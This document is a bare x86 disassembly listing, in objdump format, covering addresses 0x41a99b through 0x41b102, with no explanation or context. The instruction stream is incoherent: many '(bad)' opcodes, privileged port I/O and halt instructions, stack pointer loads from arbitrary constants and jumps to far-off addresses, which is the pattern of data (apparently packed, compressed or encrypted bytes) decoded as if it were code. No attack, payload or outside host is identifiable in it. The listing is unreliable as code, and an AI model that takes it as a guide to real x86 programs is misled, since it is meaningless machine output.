  41a99b:	addr16 mov ch,0xa5
  41a99e:	je     0x41a9be
  41a9a0:	fldl2t 
  41a9a2:	fs ret 
  41a9a4:	mov    ecx,0xc4d0dcba
  41a9a9:	mov    bl,0xba
  41a9ab:	push   0xe8c04b6a
  41a9b0:	mov    ecx,0x67933379
  41a9b5:	lea    ecx,ds:0xdf7e0a57
  41a9bb:	xchg   edi,eax
  41a9bc:	and    eax,0x8d039748
  41a9c1:	popf   
  41a9c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9c3:	xor    ch,dl
  41a9c5:	fwait
  41a9c6:	mov    ds:0x1c998ec5,al
  41a9cb:	inc    eax
  41a9cc:	sbb    al,0x8f
  41a9ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9cf:	ret    0x9511
  41a9d2:	adc    eax,0x8b37db87
  41a9d7:	adc    DWORD PTR [esp+eiz*4],esp
  41a9da:	shrd   DWORD PTR [esi],edx,0xb6
  41a9de:	sub    ch,BYTE PTR [ebp+0x4a]
  41a9e1:	add    al,0x1d
  41a9e3:	int    0xb5
  41a9e5:	hlt    
  41a9e6:	rcl    BYTE PTR [ecx-0x12],0xd2
  41a9ea:	fisub  DWORD PTR [edx+0x54]
  41a9ed:	clc    
  41a9ee:	adc    esi,ecx
  41a9f0:	xor    eax,0xee8700a1
  41a9f5:	mov    ecx,?
  41a9f7:	push   cs
  41a9f8:	lahf   
  41a9f9:	inc    si
  41a9fb:	dec    ebp
  41a9fc:	mov    edx,0xc4b35941
  41aa01:	(bad)  
  41aa02:	fild   QWORD PTR [edi]
  41aa04:	push   ebx
  41aa05:	test   eax,0x2d7cfa7c
  41aa0a:	pop    edi
  41aa0b:	jbe    0x41a9ea
  41aa0d:	xchg   ebp,eax
  41aa0e:	fstp   QWORD PTR [ebx]
  41aa10:	mov    bh,0xda
  41aa12:	imul   edi,DWORD PTR [edi+esi*4-0x4e],0x39
  41aa17:	adc    dl,BYTE PTR [ebp+0x41b3fe68]
  41aa1d:	or     eax,0x695c6485
  41aa22:	inc    ecx
  41aa23:	shl    DWORD PTR [esi-0x60],cl
  41aa26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa27:	imul   ecx,DWORD PTR [bp+di-0x2bf6],0x19
  41aa2d:	leave  
  41aa2e:	push   edi
  41aa2f:	aas    
  41aa30:	jo     0x41aa48
  41aa32:	ror    DWORD PTR [edi-0x22],0xef
  41aa36:	dec    DWORD PTR [edi]
  41aa38:	sar    BYTE PTR [edx-0x4d8dc95],0x54
  41aa3f:	pop    esi
  41aa40:	mov    esp,0xbeca5070
  41aa45:	test   ebp,esp
  41aa47:	mov    esi,0x1db59561
  41aa4c:	push   ebp
  41aa4d:	mov    ch,0xe7
  41aa4f:	shl    DWORD PTR [ebx+0x79],cl
  41aa52:	inc    eax
  41aa53:	mov    esp,0x33f5abbf
  41aa58:	dec    ebp
  41aa59:	pop    ecx
  41aa5a:	cmp    eax,0x17e61be
  41aa5f:	outs   dx,DWORD PTR ds:[esi]
  41aa60:	add    esi,DWORD PTR ss:[ecx+ebp*1-0x2378bce9]
  41aa68:	shl    BYTE PTR [edi-0x5731abeb],0x6c
  41aa6f:	cld    
  41aa70:	outs   dx,BYTE PTR ds:[esi]
  41aa71:	iret   
  41aa72:	xor    dh,BYTE PTR [esi-0x72]
  41aa75:	cmp    DWORD PTR [edx+0x35dd755c],0x7
  41aa7c:	push   esi
  41aa7d:	mov    bl,0x29
  41aa7f:	outs   dx,DWORD PTR ds:[esi]
  41aa80:	ret    
  41aa81:	mov    BYTE PTR [ecx-0x7c],dl
  41aa84:	or     DWORD PTR cs:[ecx+ebx*2+0x558c78d6],edx
  41aa8c:	call   0x12bacc91
  41aa91:	and    bh,BYTE PTR [esi+0x33613bfe]
  41aa97:	in     al,0x33
  41aa99:	fld    st(7)
  41aa9b:	retf   0xc729
  41aa9e:	or     esi,DWORD PTR [ebx-0x36]
  41aaa1:	dec    esp
  41aaa2:	sbb    al,bl
  41aaa4:	mov    al,0x90
  41aaa6:	test   al,0xc5
  41aaa8:	(bad)  
  41aaa9:	aas    
  41aaaa:	test   al,0x27
  41aaac:	xchg   BYTE PTR [edx-0x4d],al
  41aaaf:	dec    eax
  41aab0:	scas   eax,DWORD PTR es:[edi]
  41aab1:	cmp    ebp,edi
  41aab3:	retf   0x6c0a
  41aab6:	in     eax,0xb8
  41aab8:	and    al,0x91
  41aaba:	mov    ebp,ebp
  41aabc:	rcr    BYTE PTR [edx-0x49a828fd],0xd0
  41aac3:	(bad)
  41aac6:	lds    ebp,FWORD PTR [ebp-0x259acf57]
  41aacc:	loop   0x41aa7a
  41aace:	or     al,0xfc
  41aad0:	mov    ecx,0x51e2ee83
  41aad5:	or     edi,ebp
  41aad7:	cdq    
  41aad8:	cli    
  41aad9:	push   edi
  41aada:	mov    ebx,DWORD PTR [esi+0x2e03970e]
  41aae0:	jmp    0x41ab5a
  41aae2:	inc    edx
  41aae3:	xchg   esp,eax
  41aae4:	jnp    0x41aaa7
  41aae6:	jns    0x41ab5d
  41aae8:	(bad)  
  41aaea:	xchg   ecx,eax
  41aaeb:	push   cs
  41aaec:	sbb    BYTE PTR [edx-0x35eb4a3f],bl
  41aaf2:	dec    DWORD PTR [edx+0x38154dd2]
  41aaf8:	gs jle 0x41ab11
  41aafb:	xor    al,ah
  41aafd:	xchg   esi,eax
  41aafe:	lods   al,BYTE PTR ds:[esi]
  41aaff:	int    0x7e
  41ab01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab02:	imul   ecx,edx,0x8048aa3f
  41ab08:	push   ebx
  41ab09:	add    eax,0x5911be1
  41ab0e:	adc    eax,0x10c1f4bb
  41ab13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab14:	sub    eax,0x9f5c295e
  41ab19:	jmp    0x3701:0xb287f819
  41ab20:	fistp  QWORD PTR [ebx]
  41ab22:	and    BYTE PTR [edi],dl
  41ab24:	xor    ebp,DWORD PTR [ebx]
  41ab26:	add    edi,DWORD PTR [ebp-0x6817f429]
  41ab2c:	or     edi,DWORD PTR [esi-0x14]
  41ab2f:	adc    DWORD PTR [ecx-0x5e],esp
  41ab32:	leave  
  41ab33:	jmp    0x1a21d5b0
  41ab38:	fld    DWORD PTR [esi]
  41ab3a:	call   FWORD PTR [edx-0x4a]
  41ab3d:	addr16 xchg esp,eax
  41ab3f:	in     eax,dx
  41ab40:	fs pop ecx
  41ab42:	or     BYTE PTR ds:[ebx+0x67],cl
  41ab46:	rcl    BYTE PTR [esp+esi*2-0x5c9ca51e],1
  41ab4d:	sub    eax,0x5e147dd
  41ab52:	ins    DWORD PTR es:[edi],dx
  41ab53:	and    DWORD PTR [edi+eax*8+0x9],esp
  41ab57:	outs   dx,DWORD PTR ds:[esi]
  41ab58:	les    esi,FWORD PTR [ebp-0x5a2cc794]
  41ab5e:	daa    
  41ab5f:	test   al,0x6d
  41ab61:	iret   
  41ab62:	cmp    eax,0xbcec8839
  41ab67:	xchg   esi,eax
  41ab68:	je     0x41ab66
  41ab6a:	cmp    esi,DWORD PTR [ecx]
  41ab6c:	mov    ch,0xcd
  41ab6e:	fidivr WORD PTR [edi]
  41ab70:	(bad)  
  41ab71:	mov    ?,edi
  41ab73:	pop    ds
  41ab74:	mov    ch,0x5a
  41ab76:	or     bl,cl
  41ab78:	push   cs
  41ab79:	xchg   ebp,eax
  41ab7a:	mov    dl,0x41
  41ab7c:	dec    ebx
  41ab7d:	pop    esp
  41ab7e:	fnstsw WORD PTR [eax+0x26]
  41ab81:	sbb    BYTE PTR [ecx-0x6d],dh
  41ab84:	lea    esi,[ecx-0xd71d4c4]
  41ab8a:	fdiv   DWORD PTR [edi+0x6e]
  41ab8d:	bound  edx,QWORD PTR [eax-0x6d9ea2ab]
  41ab93:	repz aad 0xf1
  41ab96:	cdq    
  41ab97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab98:	int3   
  41ab99:	mov    ebp,ss
  41ab9b:	out    dx,al
  41ab9c:	xchg   esp,eax
  41ab9d:	enter  0xab8d,0xf6
  41aba1:	les    edx,FWORD PTR ss:[esp+ebx*2]
  41aba5:	leave  
  41aba6:	outs   dx,DWORD PTR ds:[esi]
  41aba7:	iret   
  41aba8:	dec    edx
  41aba9:	push   ds
  41abaa:	shr    BYTE PTR [edx-0x79],cl
  41abad:	call   0xf6ea:0x73180cce
  41abb4:	sbb    dl,BYTE PTR [ecx]
  41abb6:	sub    ah,BYTE PTR [eax+edi*8+0x45]
  41abba:	xchg   DWORD PTR [ebp+0x22eded34],eax
  41abc0:	mov    dh,BYTE PTR [edx]
  41abc2:	aam    0x69
  41abc4:	outs   dx,DWORD PTR ds:[esi]
  41abc5:	mov    ebp,0xb8305942
  41abca:	ror    ebx,cl
  41abcc:	bound  edx,QWORD PTR [ecx-0x51]
  41abcf:	adc    eax,0x9f953ee0
  41abd4:	mov    ?,WORD PTR [edx+edi*4-0x27]
  41abd8:	mov    ah,0x3f
  41abda:	daa    
  41abdb:	fwait
  41abdc:	into   
  41abdd:	das    
  41abde:	xor    al,0xc9
  41abe0:	pop    edx
  41abe1:	add    ebx,0x2215fc49
  41abe7:	les    edi,FWORD PTR [ebp+0x3c1f6558]
  41abed:	scas   al,BYTE PTR es:[edi]
  41abee:	mov    ecx,DWORD PTR [eax+0x55]
  41abf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abf2:	scas   al,BYTE PTR es:[edi]
  41abf3:	mov    eax,0x1450a42d
  41abf8:	add    esp,eax
  41abfa:	jge    0x41ac24
  41abfc:	inc    eax
  41abfd:	out    dx,al
  41abfe:	ror    DWORD PTR [eax-0x569cf378],cl
  41ac04:	adc    bl,dl
  41ac06:	lds    eax,FWORD PTR ds:0xbf5e4ab1
  41ac0c:	in     eax,dx
  41ac0d:	rol    eax,1
  41ac0f:	in     al,0xdb
  41ac11:	jno    0x41ac43
  41ac13:	fs pop ecx
  41ac15:	repnz mov ds:0xc52458a,al
  41ac1b:	or     ch,BYTE PTR [esi+edi*8+0x10]
  41ac1f:	cli    
  41ac20:	fs push eax
  41ac22:	push   0x50c0d873
  41ac27:	mov    bl,0x21
  41ac29:	jb     0x41abf1
  41ac2b:	inc    ebp
  41ac2c:	pop    eax
  41ac2d:	std    
  41ac2e:	test   DWORD PTR [esi+ebp*2+0xd],0x622790bc
  41ac36:	adc    al,BYTE PTR [edx+0x57b58902]
  41ac3c:	xor    bh,ch
  41ac3e:	mov    eax,es:0x3a17d4ef
  41ac44:	inc    ebp
  41ac45:	out    dx,eax
  41ac46:	lods   al,BYTE PTR ds:[esi]
  41ac47:	stc    
  41ac48:	and    al,0x2f
  41ac4a:	call   0xe654f64
  41ac4f:	and    ecx,DWORD PTR [eax-0x5f38a290]
  41ac55:	sbb    BYTE PTR [edx],al
  41ac57:	les    esi,FWORD PTR [ecx]
  41ac59:	push   edx
  41ac5a:	dec    esp
  41ac5b:	inc    ecx
  41ac5c:	push   esi
  41ac5d:	or     BYTE PTR [ebx-0xeb91b82],al
  41ac63:	les    edx,FWORD PTR [edi+0x39]
  41ac66:	xor    eax,0x998c3d79
  41ac6b:	popf   
  41ac6c:	lahf   
  41ac6d:	dec    esi
  41ac6e:	psrad  mm2,QWORD PTR [ecx]
  41ac71:	dec    ebp
  41ac72:	sub    ah,BYTE PTR [eax*8-0x2c983a4b]
  41ac79:	scas   eax,DWORD PTR es:[edi]
  41ac7a:	stos   DWORD PTR es:[edi],eax
  41ac7b:	nop
  41ac7c:	xchg   ebp,eax
  41ac7d:	nop
  41ac7e:	xchg   edi,eax
  41ac7f:	inc    esi
  41ac80:	mov    edi,0x3770354b
  41ac85:	mov    al,BYTE PTR [edx+0x57]
  41ac88:	inc    ebp
  41ac89:	icebp  
  41ac8a:	cmpxchg BYTE PTR [edi],dh
  41ac8d:	xchg   ecx,eax
  41ac8e:	push   esi
  41ac8f:	add    BYTE PTR [edi-0xb5ee3e0],0x6d
  41ac96:	inc    ebx
  41ac97:	sub    ecx,ecx
  41ac99:	cmovo  eax,DWORD PTR [ebx]
  41ac9c:	pop    esp
  41ac9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac9e:	sbb    dh,ch
  41aca0:	push   esp
  41aca1:	jg     0x41ac82
  41aca3:	mov    al,0xb4
  41aca5:	scas   eax,DWORD PTR es:[edi]
  41aca6:	mov    ds:0x45773607,al
  41acab:	mov    ebp,0xa0e014f
  41acb0:	hlt    
  41acb1:	xor    eax,0xb9c06429
  41acb6:	and    eax,esp
  41acb8:	lahf   
  41acb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acba:	or     al,0xde
  41acbc:	pop    edi
  41acbd:	ret    0x85db
  41acc0:	sub    al,0x91
  41acc2:	adc    eax,0x4b9c212c
  41acc7:	or     al,0x74
  41acc9:	fcom   DWORD PTR [edi-0x1f]
  41accc:	jmp    0x41ad3f
  41acce:	in     al,0x6d
  41acd0:	out    0x2e,al
  41acd2:	inc    esp
  41acd3:	aaa    
  41acd4:	shr    BYTE PTR [edi+edi*4],1
  41acd7:	dec    ecx
  41acd8:	mov    WORD PTR [eax+0x52],ss
  41acdb:	mov    ch,0xc1
  41acdd:	xchg   ecx,eax
  41acde:	rcr    BYTE PTR [edx],0x6c
  41ace1:	mov    ah,0x65
  41ace3:	cmp    DWORD PTR [edx+edi*8-0x78],eax
  41ace7:	loopne 0x41ad48
  41ace9:	aad    0x92
  41aceb:	sbb    BYTE PTR [edx-0x2a692cdd],al
  41acf1:	mov    ecx,DWORD PTR [eax]
  41acf3:	mov    eax,0xbdf0dab4
  41acf8:	dec    ebp
  41acf9:	(bad)
  41acfc:	and    al,0x8d
  41acfe:	push   edi
  41acff:	push   eax
  41ad00:	jmp    0x41acf3
  41ad02:	in     al,0x84
  41ad04:	jbe    0x41ad6a
  41ad06:	mov    al,ds:0x8f5fafed
  41ad0b:	adc    BYTE PTR [ecx+0x4c7bf18c],0xd1
  41ad12:	add    cl,0x46
  41ad15:	cwde   
  41ad16:	sbb    DWORD PTR [ecx],0x3
  41ad19:	pop    ebp
  41ad1b:	adc    DWORD PTR [esi+0x5b],ebp
  41ad1e:	dec    edi
  41ad1f:	cdq    
  41ad20:	call   0x399b2472
  41ad25:	imul   esp,ebx,0x38
  41ad28:	popf   
  41ad29:	(bad)  
  41ad2a:	sub    eax,edi
  41ad2c:	mov    edi,0x888df815
  41ad31:	mov    ah,0x80
  41ad33:	mov    esi,0xc5724953
  41ad38:	dec    esp
  41ad39:	enter  0xe7da,0x37
  41ad3d:	test   dh,0xb4
  41ad40:	cdq    
  41ad41:	outs   dx,DWORD PTR ds:[esi]
  41ad42:	and    eax,0x8bbf0a4a
  41ad47:	push   esp
  41ad48:	jbe    0x41ad09
  41ad4a:	or     al,0xc5
  41ad4c:	jp     0x41acea
  41ad4e:	aad    0xd
  41ad50:	test   eax,0x394138f1
  41ad55:	xor    edx,ebp
  41ad57:	add    al,0x7d
  41ad59:	pushf  
  41ad5a:	and    BYTE PTR [edi+0x11],bh
  41ad5d:	xchg   ecx,eax
  41ad5e:	fist   DWORD PTR [edi-0x43]
  41ad61:	jnp    0x41ad81
  41ad63:	(bad)  
  41ad65:	shl    DWORD PTR [edx+0x7a55c606],1
  41ad6b:	cmc    
  41ad6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad6d:	lahf   
  41ad6e:	push   ecx
  41ad6f:	jmp    DWORD PTR es:[esi+0x58f6c491]
  41ad76:	mov    dh,0xa0
  41ad78:	scas   al,BYTE PTR es:[edi]
  41ad79:	mov    ah,0xdb
  41ad7b:	jge    0x41ad2b
  41ad7d:	mov    ds:0xef3ffe80,eax
  41ad82:	push   0x4802408f
  41ad87:	in     al,0xb5
  41ad89:	dec    edx
  41ad8a:	imul   ebx,DWORD PTR [esi+0xa],0x3a
  41ad8e:	pop    edi
  41ad8f:	mov    dh,0x94
  41ad91:	test   BYTE PTR [ecx-0x385dfded],0x53
  41ad98:	data16 or al,0xe0
  41ad9b:	xchg   edx,ebp
  41ad9d:	xchg   DWORD PTR [ebp+ecx*1-0x495b03fc],esi
  41ada4:	into   
  41ada5:	mov    al,ds:0xb42dc83a
  41adaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adab:	imul   esp,DWORD PTR [ecx-0xec431fd],0x5c
  41adb2:	mov    al,0xee
  41adb4:	mov    bl,0xa9
  41adb6:	popf   
  41adb7:	jne    0x41ae2e
  41adb9:	jae    0x41ad76
  41adbb:	sub    BYTE PTR [ecx],bl
  41adbd:	ss cmp bl,ah
  41adc0:	outs   dx,BYTE PTR ds:[esi]
  41adc1:	cmp    al,BYTE PTR fs:[edx-0x4578f25a]
  41adc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adc9:	imul   ebp,ebp,0x612699a7
  41adcf:	clc    
  41add0:	pop    ss
  41add1:	dec    ebp
  41add2:	fild   DWORD PTR [edx]
  41add4:	inc    ebp
  41add5:	push   ds
  41add6:	sub    BYTE PTR ds:0xe966e4d4,bh
  41addc:	jmp    0x1b1d2361
  41ade1:	shl    BYTE PTR [edi+0x76916a50],0xfa
  41ade8:	jbe    0x41adaa
  41adea:	cdq    
  41adeb:	jae    0x41ae0e
  41aded:	cmp    BYTE PTR [edi-0x8461d9f],0x20
  41adf4:	dec    edi
  41adf5:	xlat   BYTE PTR ds:[ebx]
  41adf6:	push   ds
  41adf7:	push   ebx
  41adf8:	or     BYTE PTR [ecx],bh
  41adfa:	pop    ebp
  41adfb:	xchg   esi,eax
  41adfc:	adc    DWORD PTR [ecx+0x65],eax
  41adff:	leave  
  41ae00:	in     al,dx
  41ae01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae02:	lahf   
  41ae03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae04:	sub    bh,BYTE PTR [edi-0x4982b344]
  41ae0a:	stc    
  41ae0b:	cmp    BYTE PTR [ebx-0x3d2ee01a],dl
  41ae11:	inc    ebp
  41ae12:	xchg   ebp,eax
  41ae13:	cdq    
  41ae14:	lods   eax,DWORD PTR ds:[esi]
  41ae15:	aas    
  41ae16:	inc    edi
  41ae17:	add    BYTE PTR [esi+0x451e2bb9],dh
  41ae1d:	ret    
  41ae1e:	mov    al,ds:0xe33eab05
  41ae23:	mov    edx,0x1f0031ac
  41ae28:	call   0xe8834d8f
  41ae2d:	sub    BYTE PTR [ebx+0x4052a2b9],ah
  41ae33:	adc    ah,BYTE PTR [edi]
  41ae35:	jmp    0x3e09213f
  41ae3a:	sub    bh,dh
  41ae3c:	add    al,0x1
  41ae3e:	int    0x57
  41ae40:	lods   eax,DWORD PTR ds:[esi]
  41ae41:	dec    ebp
  41ae42:	pop    ebx
  41ae43:	or     ebx,eax
  41ae45:	adc    eax,0x9f94b1d3
  41ae4a:	dec    BYTE PTR [esi+0x62fb132a]
  41ae50:	push   edx
  41ae51:	shl    BYTE PTR [ebx+esi*1-0x50],cl
  41ae55:	add    bh,dh
  41ae57:	test   eax,0x7a6c5e51
  41ae5c:	xchg   esi,eax
  41ae5d:	adc    DWORD PTR [edx-0x50],edi
  41ae60:	xchg   esp,eax
  41ae61:	(bad)  
  41ae62:	xchg   ebx,eax
  41ae63:	daa    
  41ae64:	cld    
  41ae65:	jmp    0x41aee4
  41ae67:	sub    BYTE PTR [edx+0x36],cl
  41ae6a:	push   eax
  41ae6b:	sub    eax,0xb4304adc
  41ae70:	adc    DWORD PTR [ebx+0x5864d15e],ecx
  41ae76:	mov    esp,0xc1f38918
  41ae7b:	sbb    al,bh
  41ae7d:	ins    BYTE PTR es:[edi],dx
  41ae7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae7f:	dec    esp
  41ae80:	shl    ecx,1
  41ae82:	fsubr  DWORD PTR [ebp-0x31]
  41ae85:	popf   
  41ae86:	inc    esp
  41ae87:	das    
  41ae88:	sti    
  41ae89:	mov    WORD PTR [ebx],ds
  41ae8b:	mov    eax,0x129ec50c
  41ae90:	pop    edi
  41ae91:	or     edx,DWORD PTR [ebx+0xe7c0e19]
  41ae97:	xor    BYTE PTR [eax-0x56],bh
  41ae9a:	ins    BYTE PTR es:[edi],dx
  41ae9b:	imul   edi,DWORD PTR ds:0x87033749,0x62
  41aea2:	ror    BYTE PTR [edx-0x25c75a8b],1
  41aea8:	push   ebx
  41aea9:	xor    edi,DWORD PTR [esi-0x61a2e770]
  41aeaf:	test   eax,0x4760a4a0
  41aeb4:	add    ch,BYTE PTR [ecx]
  41aeb6:	add    ebp,ebx
  41aeb8:	sbb    esi,0x3
  41aebb:	hlt    
  41aebc:	retf   0xe32a
  41aebf:	xor    ebx,DWORD PTR [esi-0x5b]
  41aec2:	sahf   
  41aec3:	add    dh,BYTE PTR [esi-0x49]
  41aec6:	xlat   BYTE PTR ds:[ebx]
  41aec7:	mov    ch,0x24
  41aec9:	das    
  41aeca:	push   ds
  41aecb:	inc    eax
  41aecc:	xchg   ebx,eax
  41aecd:	xlat   BYTE PTR ds:[ebx]
  41aece:	mov    eax,edi
  41aed0:	mov    esi,DWORD PTR [edx+edx*4-0x7e99c53f]
  41aed7:	cmc    
  41aed8:	adc    al,0xbf
  41aeda:	retf   
  41aedb:	add    al,0x85
  41aedd:	pop    ecx
  41aede:	sub    al,0xcb
  41aee0:	inc    eax
  41aee1:	or     BYTE PTR [ebx],ch
  41aee3:	dec    eax
  41aee4:	lds    edx,FWORD PTR [ebp-0x4c]
  41aee7:	arpl   ax,di
  41aee9:	repnz (bad) 
  41aeeb:	fidiv  WORD PTR [edx-0x39]
  41aeee:	push   cs
  41aeef:	std    
  41aef0:	push   ds
  41aef1:	mov    ebp,0x4c7a41cf
  41aef6:	outs   dx,BYTE PTR ds:[esi]
  41aef7:	(bad)  
  41aef8:	xchg   DWORD PTR [ecx-0x8],esp
  41aefb:	mov    al,BYTE PTR [esi+0x55f81113]
  41af01:	adc    DWORD PTR [ebx],eax
  41af03:	ret    
  41af04:	retf   
  41af05:	jae    0x41ae97
  41af07:	jmp    0x3ba1:0xedaf6aa
  41af0e:	fld    DWORD PTR [eax]
  41af10:	or     DWORD PTR [eax],edx
  41af12:	or     eax,0xfd781120
  41af17:	and    al,0x8c
  41af19:	scas   eax,DWORD PTR es:[edi]
  41af1a:	scas   eax,DWORD PTR es:[edi]
  41af1b:	ror    BYTE PTR [edx-0x36],cl
  41af1e:	or     esp,ebx
  41af20:	and    eax,0xffe4726f
  41af25:	cli    
  41af26:	jmp    0x5cfc:0xefa63ccc
  41af2d:	test   BYTE PTR [eax-0x7c],0x25
  41af31:	lods   eax,DWORD PTR ds:[esi]
  41af32:	xadd   BYTE PTR [edx-0x6e2cb7de],bl
  41af39:	int    0xc5
  41af3b:	inc    esp
  41af3c:	hlt    
  41af3d:	sbb    al,0xd7
  41af3f:	retf   0x59a2
  41af42:	cmp    ebp,DWORD PTR [esi]
  41af44:	fnstenv [edi+edi*4+0x4f]
  41af48:	adc    eax,0x1f635c24
  41af4d:	test   BYTE PTR [edx],ch
  41af4f:	inc    ecx
  41af50:	adc    DWORD PTR [eax*1+0x2360871],edi
  41af57:	mov    bh,0xf5
  41af59:	fadd   st,st(4)
  41af5b:	adc    al,0x6e
  41af5d:	jg     0x41af8c
  41af5f:	lods   al,BYTE PTR ds:[esi]
  41af60:	mov    ecx,0xa66f9401
  41af65:	pop    esp
  41af66:	(bad)  
  41af67:	(bad)  
  41af68:	cmp    edx,DWORD PTR [ebx]
  41af6a:	retf   0xad2e
  41af6d:	xchg   esp,eax
  41af6e:	lods   al,BYTE PTR ds:[esi]
  41af6f:	push   ebx
  41af70:	xchg   ebx,eax
  41af71:	mov    dh,BYTE PTR [edi]
  41af73:	jmp    0x8a8c633a
  41af78:	rcl    BYTE PTR [ebx-0x37],1
  41af7b:	ficomp WORD PTR [edx+0x47]
  41af7e:	push   cs
  41af7f:	ret    
  41af80:	cs adc dh,ah
  41af83:	fldcw  WORD PTR [edi+0xf]
  41af86:	(bad)  
  41af87:	fisub  DWORD PTR [esp+ecx*1]
  41af8a:	xchg   ecx,eax
  41af8b:	jae    0x41af27
  41af8d:	into   
  41af8e:	jns    0x41af63
  41af90:	jle    0x41afdf
  41af92:	not    ecx
  41af94:	dec    eax
  41af95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af96:	mov    ?,WORD PTR [edi-0x218f119]
  41af9c:	sub    eax,0x1acb752
  41afa1:	xchg   esp,eax
  41afa2:	pusha  
  41afa3:	lea    edi,ds:0x4da66888
  41afa9:	fild   QWORD PTR [edx-0x4a]
  41afac:	sub    ebx,edi
  41afae:	jl     0x41af5c
  41afb0:	mov    bh,0x6f
  41afb2:	cmc    
  41afb3:	pop    ebp
  41afb4:	mov    cl,0xdb
  41afb6:	in     eax,0xc0
  41afb8:	add    DWORD PTR [ebx-0x6e],eax
  41afbb:	jmp    0x84d46b0
  41afc0:	pop    ds
  41afc1:	lock imul ebp,DWORD PTR [ebx],0xa51d117e
  41afc8:	cmp    esi,DWORD PTR [edx-0x3c]
  41afcb:	xor    BYTE PTR [ebp+0x67afbc27],0x96
  41afd2:	sti    
  41afd3:	cmp    esp,edi
  41afd5:	test   DWORD PTR [ecx],edx
  41afd7:	out    dx,eax
  41afd8:	cmp    eax,0xf720ff56
  41afdd:	(bad)  [ecx-0x521ac28e]
  41afe3:	rol    BYTE PTR [ebx],cl
  41afe5:	xchg   edi,eax
  41afe6:	aam    0x0
  41afe8:	cmp    eax,0xfd4f2ac5
  41afed:	cmp    esp,DWORD PTR [ebx-0x71]
  41aff0:	jp     0x41b051
  41aff2:	dec    edi
  41aff3:	sbb    BYTE PTR [esi+0x6],0xbf
  41aff7:	xor    al,0x16
  41aff9:	or     ah,al
  41affb:	pusha  
  41affc:	fmul   QWORD PTR [ecx-0x20]
  41afff:	mov    DWORD PTR [edi-0x70],edi
  41b002:	sub    DWORD PTR [edi],esi
  41b004:	mov    DWORD PTR [ebp+0x35422db9],ebp
  41b00a:	fmul   QWORD PTR [edx]
  41b00c:	bound  edi,QWORD PTR [esi]
  41b00e:	in     eax,0x9c
  41b010:	pop    eax
  41b011:	out    0x97,al
  41b013:	lock pop esp
  41b015:	and    al,0x8f
  41b017:	les    eax,FWORD PTR [ebx+edi*2+0x12]
  41b01b:	add    BYTE PTR [ebx],bh
  41b01d:	mov    bh,0x3b
  41b01f:	mov    edi,0x16fa0468
  41b024:	imul   ebx,DWORD PTR [edi-0x5358b4ca],0x6d
  41b02b:	mov    ch,BYTE PTR [ecx+0x3]
  41b02e:	(bad)  
  41b02f:	mov    esp,0x73f57c99
  41b034:	sbb    eax,0x99c9457f
  41b039:	xlat   BYTE PTR ds:[ebx]
  41b03a:	xchg   DWORD PTR [ebp+eiz*2+0x7887acaf],ebp
  41b041:	in     eax,dx
  41b042:	xor    bh,BYTE PTR [esi-0x2c]
  41b045:	dec    ebp
  41b046:	xchg   ecx,eax
  41b047:	pop    esi
  41b048:	fstp   DWORD PTR [ebp+0x7a9936d7]
  41b04e:	add    ch,BYTE PTR [edi-0x109dfc9f]
  41b054:	push   esp
  41b055:	xchg   edx,eax
  41b056:	out    0x9c,eax
  41b058:	fwait
  41b059:	dec    ebp
  41b05a:	mov    dh,0xe4
  41b05c:	mov    esp,0xb016ff57
  41b061:	jmp    0x7e45e873
  41b066:	sahf   
  41b067:	sub    DWORD PTR [ebx],edi
  41b069:	inc    esi
  41b06a:	es inc eax
  41b06c:	xchg   ebx,eax
  41b06d:	push   esi
  41b06e:	dec    ebx
  41b06f:	fwait
  41b070:	mov    ebp,0x11650dcc
  41b075:	sub    eax,0xa22e2e50
  41b07a:	dec    edi
  41b07b:	hlt    
  41b07c:	or     dh,BYTE PTR [esi+ecx*2-0x2e8fde42]
  41b083:	nop    edx
  41b086:	popf   
  41b087:	pop    ecx
  41b088:	jnp    0x41b099
  41b08a:	inc    edi
  41b08b:	test   al,0x6e
  41b08d:	and    DWORD PTR [eiz*1-0x5a584748],ebx
  41b094:	adc    al,0x87
  41b096:	rcl    DWORD PTR [edx-0x3f],0xff
  41b09a:	and    DWORD PTR [ebx-0x62c817d7],esi
  41b0a0:	loope  0x41b050
  41b0a2:	rcr    BYTE PTR [edx-0x1bcbbd08],1
  41b0a8:	js     0x41b112
  41b0aa:	je     0x41b072
  41b0ac:	pop    esi
  41b0ad:	aaa    
  41b0ae:	(bad)  
  41b0af:	popf   
  41b0b0:	fwait
  41b0b1:	jp     0x41b0ca
  41b0b3:	in     al,0x7e
  41b0b5:	mov    esp,0x28da7c58
  41b0ba:	es inc eax
  41b0bc:	xor    eax,0x70465f48
  41b0c1:	cmp    ebp,DWORD PTR [esi-0x2ef1625d]
  41b0c7:	adc    edx,ecx
  41b0c9:	xchg   esp,eax
  41b0ca:	mov    bh,0x8e
  41b0cc:	stc    
  41b0cd:	or     al,0x59
  41b0cf:	imul   esp,DWORD PTR [ebx+0x30c588a7],0xe2219a17
  41b0d9:	xchg   DWORD PTR [eax+0x51],edx
  41b0dc:	rcl    DWORD PTR [ebx+0x3096b77b],0x40
  41b0e3:	mov    ebx,0xdd46e139
  41b0e8:	stos   BYTE PTR es:[edi],al
  41b0e9:	stc    
  41b0ea:	mov    ch,0xd9
  41b0ec:	mov    ch,0x78
  41b0ee:	inc    edx
  41b0ef:	jne    0x41b0c5
  41b0f1:	or     BYTE PTR [ebp-0x2f96d33c],bh
  41b0f7:	dec    BYTE PTR [edx+0x69]
  41b0fa:	push   ecx
  41b0fb:	xchg   BYTE PTR [ebx+0x67219c25],bh
  41b101:	dec    edi
  41b102:	into   
